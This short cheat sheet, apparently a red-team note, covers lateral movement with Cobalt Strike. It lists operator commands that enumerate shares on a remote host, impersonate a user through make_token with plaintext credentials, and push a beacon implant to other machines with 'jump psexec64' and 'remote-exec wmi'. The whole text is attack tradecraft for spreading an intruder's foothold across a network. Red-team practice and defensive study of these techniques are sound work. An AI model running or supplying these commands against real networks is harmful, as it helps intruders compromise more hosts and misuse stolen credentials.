### Lateral Moment using.....
---

Listing available shares on remote host:

    shell net view \\192.168.56.111 /all

Cobalt Strike has 3 features for executing beacon, command or code.

In-built command
1. jump

Using PsExec

    In new version
    jump psexec64 remote_host listenrname
    
    In old version
    psexec remote_host share_name listener
    
To use plaintext creds wih jump or remote-exec, always use make_token first

    make_token [Domain\]user_name password
    jump psexec64 remote_host listenrname

In-built command
2. Remote-exec

remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
